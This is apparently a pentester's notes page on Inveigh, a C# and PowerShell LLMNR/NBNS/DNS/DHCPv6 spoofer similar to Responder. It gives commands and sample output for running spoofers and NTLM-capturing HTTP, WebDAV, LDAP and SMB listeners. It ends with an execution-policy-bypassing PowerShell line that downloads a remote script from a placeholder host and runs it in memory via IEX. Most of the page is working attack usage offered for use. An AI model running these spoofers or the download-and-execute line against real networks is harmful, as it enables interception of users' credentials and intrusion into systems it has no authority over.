> [!info] About
An LLMNR/DNS/NBNS/etc poofer with both IPv4 and IPv6 support written in C#. Similar to Responder.

# Examples
### Default (Autodetect local IPs)
This will run with the default settings.
```powershell
.\Inveigh.exe
[*] Inveigh 2.0 [Started 2021-06-15T00:08:37 | PID 12588]
[+] Packet Sniffer Addresses [IP 10.10.2.111 | IPv6 fe80::3d3b:b73c:c43e:ed4e%2]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 10.10.2.111 | IPv6 fe80::3d3b:b73c:c43e:ed4e%2]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[-] DHCPv6
[+] DNS Packet Sniffer [Type A]
[-] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[-] MDNS
[-] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[-] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[-] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Users\dev\source\repos\Inveigh\Inveigh\bin\Debug\net35]
[+] Previous Session Files [Imported]
[*] Press ESC to enter/exit interactive console
```

### Listener Only Mode
>[!tip]
>With the packet sniffer disabled, Inveigh will attempt to start SMB listeners for IPv4 and IPv6. 
>On most windows systems, port 445 will already be in use. Either ignore error or add `-smb n`


```powershell
.\Inveigh.exe -sniffer n

.\Inveigh.exe -sniffer n -smb n
```

### DHCPv6
Start DHCPv6 spoofer and IPv6 DNS spoofer. Note, DNS is on by default.
````powershell
.\Inveigh.exe -dhcpv6 y
````

#### Start DHCPv6 spoofer and spoof DNS requests for internal domain only.
```powershell
.\Inveigh.exe -dhcpv6 y -replytodomains lab.inveigh.org
```

# Repository
https://github.com/Kevin-Robertson/Inveigh

# Invoke-Inveigh and log output to file
```
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://uri.whatever/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y –Proxy Y -LogOutput Y -FileOutput Y"
```